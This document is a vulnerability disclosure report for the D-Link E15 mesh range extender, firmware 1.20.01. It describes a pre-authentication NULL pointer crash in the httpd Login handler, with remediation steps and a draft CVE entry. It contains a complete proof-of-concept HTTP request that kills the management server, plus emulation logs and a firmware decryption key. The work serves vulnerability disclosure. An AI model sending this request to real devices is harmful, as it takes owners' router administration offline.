# D-Link E15 1.20.01 was discovered to contain a NULL pointer dereference denial of service in the Login handler

## Overview

- Vendor: D-Link
- Product: E15 AX1800 Mesh Range Extender
- Version: 1.20.01
- Component: bin/httpd, /DHMAPI/ Login action
- Vulnerability Class: CWE-476 NULL pointer dereference (denial of service)
- CVSS 3.1 (tentative): 7.5 High `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Manufacturer: https://www.dlink.com/

## Affected versions

- `E15_reva_Firmware_12001.bin`.
  (`MH01` container decrypted with the delink-ng E15 key
  `044b4e59846ecee953662ff2238fcc23`).
- `bin/httpd`.
- `lib/libutils.so`.

## Vulnerability details

`httpd` dispatches requests to `/DHMAPI/` by the `API-ACTION`
request header (the DHMAPI variant of D-Link HNAP). The `Login`
action is handled before any session/HMAC validation. Its XML parser
walks the children of `<Login>` and stores:

- `<Action>` value in `s6`,
- `<Username>` value in `s5`,
- `<LoginPassword>` value in `s7`.

At image offset `0x4708ac` (image base `0x400000`) it executes:

```c
strcmp(s6, "FirmwareQueryService");
```

without checking `s6` for NULL. If `<Action>` is missing or empty,
the parser leaves `s6 == NULL` and the `strcmp` faults. The fault is
fatal to the main `httpd` process: after the request, TCP port 80 is
closed and the management UI is unreachable until the process is
restarted. The request needs no `API-AUTH`, no `Cookie`, and no
knowledge of the device password; `API-ACTION: Login` is enough to
enter the vulnerable handler.

## PoC

```http
POST /DHMAPI/ HTTP/1.0
Host: <router>
Content-Type: text/xml
API-ACTION: Login
Content-Length: 259

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<Login/>
</soap:Body>
</soap:Envelope>
```

There is no `API-AUTH` header and no cookie. The Content-Length value
must match the body.

An empty value, `<Login><Action></Action></Login>`, crashes the same
way. `<Login><Action>Login</Action>...` and
`<Login><Action>request</Action>...` return 401 and leave the server
running, confirming that the missing/empty Action node is the
trigger.

## Dynamic verification

Stock `httpd` and the extracted rootfs were run under
`qemu-mips-static` 6.2.0 in `bwrap --unshare-user --unshare-net
--uid 0 --gid 0 --cap-add CAP_NET_BIND_SERVICE` (private network
namespace, port 80). `/usr/sbin/csmanuds` was started first so the
stock `httpd` could initialize its config socket; no target binary
was patched.

Observed with `busybox nc` as the client:

```text
=== before GET ===
before_rc=0
=== send <Login/> without Action ===
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
nc_rc=0
=== after GET ===
wget: can't connect to remote host (127.0.0.1): Connection refused
after_rc=1
```

The guest SIGSEGV corresponds to the real `strcmp(NULL, ...)`; the
same handler returns 401 when the Action value is present, so the
fault is not a qemu artifact.

## Impact

An unauthenticated remote attacker can terminate the E15 management
web server with a single request. Repeating the request keeps the
administration interface (and any local UI features served by the
same process) unavailable. On devices with a watchdog the daemon may
restart, so the attacker must resend the request to maintain the
denial of service. No configuration change or credential is
required.

## Remediation

- Check every XML node/value pointer for NULL before `strcmp`,
  `strlen`, or copies; reject `<Login>` requests without an explicit
  non-empty `<Action>`.
- Return a structured SOAP error (`API_INVALID_ARGUMENTS`) instead of
  entering the login state machine with a missing Action.
- Run the HTTP parser/handler in a supervised worker so a single
  malformed request cannot terminate the whole management service.

## Known-CVE relation

- NVD keyword search on 2026-11-08 for `D-Link E15` returned only
  CVE-2026-112146 (hard-coded MQTT broker credentials in
  `/etc/emDaemon/passwd`, E15/M32/R15/R32, published 2026-10-19),
  which is a different component and issue class. No entry describes
  this Login NULL dereference.
- Candidate 0-day; no CVE assigned and no vendor contact has been
  made.

## Evidence

`experiments/vulnerability-triage/results/20261108-dlink-e15-12001-preauth-dos-01/evidence/`

- `request_noaction.bin`, `request_emptyaction.bin` — exact request
  bytes (no auth header, no cookie).
- `request_noaction.hex` — minimal-request hexdump.
- `run_noaction.log`, `run_emptyaction.log` — readiness, SIGSEGV and
  post-crash connection-refused transcripts.
- `dos_probe.sh` — in-namespace probe script.
- `static_notes.txt` — handler offsets and NULL `strcmp` path.

## Additional Information

```markdown
### Vendor
D-Link

### Product
E15 AX1800 Mesh Range Extender

### Version or Commit
1.20.01

### Vulnerability Class
CWE-476 NULL pointer dereference (denial of service)

### Description
The /DHMAPI/ Login handler stores the XML Action value and calls strcmp without a NULL check. A <Login/> element with no Action crashes the main httpd process, denying access to the management UI. The request needs no API-AUTH header and no cookie.

### Affected_component
bin/httpd, /DHMAPI/ Login action

### Attack_vector
Unauthenticated POST /DHMAPI/ with API-ACTION: Login and a <Login/> body without <Action>.

### Product_version
E15 AX1800 Mesh Range Extender 1.20.01

### Reference
- https://www.dlink.com/
- https://github.com/vuln-1/vuln/blob/main/D-Link/E15_V1.20.01/report-2.md
```
